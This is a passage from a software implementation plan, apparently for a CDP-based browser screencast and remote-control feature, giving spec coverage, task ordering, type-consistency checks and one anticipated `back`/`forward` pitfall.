**Spec coverage.** Problem and goal → Tasks 3–7. The four decisions → human scope in Task 2's `COMMAND_TYPES`, tab switching in Tasks 3 and 5, both consumers in Task 6, narrow protocol in Task 2. Measurements → Task 2's `SCREENCAST_PARAMS` and Task 8's re-measurement. Protocol table → Tasks 2 and 3. Security properties → Task 2's scheme and coordinate tests plus Task 3's lease tests. Error handling → Task 3 step 3. Testing section → Tasks 2, 4, 5, 8. Known gaps → carried into the PR body in Task 8.

**Deferred deliberately, and not a gap:** removing `BrowserEndpoint.live_view_url` and `live_view_path`. It must follow the image deploy, so it is a separate change; Task 7 step 3 says so explicitly rather than leaving a stray grep hit to puzzle someone.

**Ordering.** 1 → 2 are independent of each other but both precede 3. 4 needs 3. 5 is independent of 1–4 and could run in parallel. 6 needs 5. 7 needs everything. 8 is last.

**Type consistency.** `CdpClient.call(method, params, *, session, timeout)` is used with that signature in Tasks 3 and 4. `translate(message, *, viewport)` returns `(method, params)` throughout. `COMMAND_TYPES` excludes `switch_tab` in both Task 2's test and Task 3's routing. `<BrowserShell src hasControl onDisconnect testId>` is defined in Task 5 and consumed with those exact props in Task 6.

**The one thing I expect to bite.** `back`/`forward` are in `COMMAND_TYPES` but not in `translate`, because they need a `Page.getNavigationHistory` round trip. That asymmetry is deliberate and documented in Task 2, but it is exactly the kind of thing an implementer half-reads and then wonders why `translate` raises on a verb the lease gate admits.
